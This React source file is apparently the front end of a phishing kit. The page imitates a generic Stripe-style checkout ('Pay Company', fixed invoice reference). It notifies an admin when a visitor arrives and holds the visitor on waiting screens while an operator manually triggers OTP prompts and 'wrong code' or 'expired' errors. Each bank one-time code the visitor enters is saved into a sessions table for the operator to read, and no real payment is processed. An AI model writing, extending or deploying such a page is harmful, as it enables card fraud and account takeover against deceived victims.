import { useState, useEffect, useMemo, useRef } from "react";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import PaymentRejected from "@/components/PaymentRejected";
import WaitingScreen from "@/components/WaitingScreen";
import { supabase } from "@/integrations/supabase/client";

const Index = () => {
  const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
  const visitorId = useRef(crypto.randomUUID());

  // Join presence channel so admin knows someone is on the page
  useEffect(() => {
    const channel = supabase.channel("visitors", {
      config: { presence: { key: visitorId.current } },
    });

    channel
      .on("presence", { event: "sync" }, () => {})
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await channel.track({
            online_at: new Date().toISOString(),
            visitor_id: visitorId.current,
          });
        }
      });

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);
  const [amount, setAmount] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [otpError, setOtpError] = useState<string | null>(null);

  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;

  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  const formattedTotal = isValidAmount ? formatEuro(total) : "€0.00";

  const handleFormSubmit = (id: string) => {
    setSessionId(id);
    setStep("waiting");
  };

  useEffect(() => {
    if (!sessionId || (step !== "waiting" && step !== "processing" && step !== "otp")) return;

    const channel = supabase
      .channel(`session-${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          const newStatus = (payload.new as any).status;
          if (step === "waiting") {
            if (newStatus === "otp") { setOtpError(null); setStep("otp"); }
            if (newStatus === "rejected") setStep("rejected");
          }
          if (step === "otp") {
            if (newStatus === "otp_wrong") {
              setOtpError("The verification code you entered is incorrect. Please try again.");
              // Stay on OTP screen
            }
            if (newStatus === "otp_expired") {
              setOtpError("This verification code has expired. Please request a new one.");
            }
            if (newStatus === "rejected") setStep("rejected");
          }
          if (step === "processing") {
            if (newStatus === "success") setStep("success");
            if (newStatus === "rejected") setStep("rejected");
            if (newStatus === "otp_wrong") {
              setOtpError("The verification code you entered is incorrect. Please try again.");
              setStep("otp");
            }
            if (newStatus === "otp_expired") {
              setOtpError("This verification code has expired. Please request a new one.");
              setStep("otp");
            }
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, step]);

  const handleOtpSubmit = async (otp: string) => {
    setOtpError(null);
    if (sessionId) {
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
      const existingData = (data?.form_data as Record<string, any>) || {};
      await supabase
        .from("sessions")
        .update({ 
          status: "otp_submitted" as any, 
          form_data: { ...existingData, otp } as any 
        })
        .eq("id", sessionId);
    }
    setStep("processing");
  };

  return (
    <div className="min-h-screen bg-stripe-bg flex">
      {/* Left panel — branding / order summary */}
      <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14">
        <div>
          <div className="flex items-center gap-2 mb-12">
            <div className="h-8 w-8 rounded-full bg-primary flex items-center justify-center">
              <span className="text-primary-foreground text-sm font-bold">P</span>
            </div>
            <span className="text-white/90 font-semibold text-lg">Pay</span>
          </div>

          <div className="space-y-6">
            <div>
            <p className="text-white/50 text-sm">Pay Company</p>
              <p className="text-white/40 text-xs mt-0.5">Ref: INV#2849300392</p>
              <p className="text-white text-4xl font-bold tracking-tight mt-1">
                {isValidAmount ? formatEuro(total) : "€0.00"}
              </p>
            </div>

            <div className="space-y-4 mt-8">
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Amount</p>
                <p className="text-white/90 text-sm">
                  {isValidAmount ? formatEuro(parsedAmount) : "—"}
                </p>
              </div>
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                <p className="text-white/90 text-sm">
                  {isValidAmount ? formatEuro(transactionFee) : "—"}
                </p>
              </div>
              <div className="flex items-center justify-between py-3">
                <p className="text-white/90 text-sm font-semibold">Total</p>
                <p className="text-white text-sm font-semibold">
                  {isValidAmount ? formatEuro(total) : "—"}
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-4 text-white/30 text-xs">
          <span>Powered by <span className="font-semibold text-white/50">Pay</span></span>
          <span>·</span>
          <a href="#" className="hover:text-white/50 transition-colors">Terms</a>
          <a href="#" className="hover:text-white/50 transition-colors">Privacy</a>
        </div>
      </div>

      {/* Right panel — form area */}
      <div className="flex-1 flex items-start justify-center bg-background rounded-tl-none lg:rounded-tl-2xl lg:rounded-bl-2xl overflow-y-auto">
        <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
          {/* Mobile header */}
          <div className="lg:hidden mb-8">
            <div className="flex items-center gap-2 mb-4">
              <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
                <span className="text-primary-foreground text-xs font-bold">P</span>
              </div>
              <span className="text-foreground font-semibold">Pay</span>
            </div>
            <p className="text-muted-foreground text-sm">Pay Company</p>
              <p className="text-muted-foreground/60 text-xs mt-0.5">Ref: INV#2849300392</p>
            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
              {isValidAmount ? formatEuro(total) : "€0.00"}
            </p>
            {isValidAmount && (
              <div className="mt-3 space-y-1.5">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                  <span className="text-foreground">{formatEuro(transactionFee)}</span>
                </div>
                <div className="flex items-center justify-between text-sm font-semibold">
                  <span className="text-foreground">Total</span>
                  <span className="text-foreground">{formatEuro(total)}</span>
                </div>
              </div>
            )}
          </div>

          {step === "form" && (
            <PaymentForm
              amount={amount}
              onAmountChange={setAmount}
              total={total}
              isValidAmount={isValidAmount}
              formatEuro={formatEuro}
              onSuccess={handleFormSubmit}
            />
          )}
          {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} />}
          {step === "processing" && <WaitingScreen amount={formattedTotal} />}
          {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
          {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
        </div>
      </div>
    </div>
  );
};

export default Index;
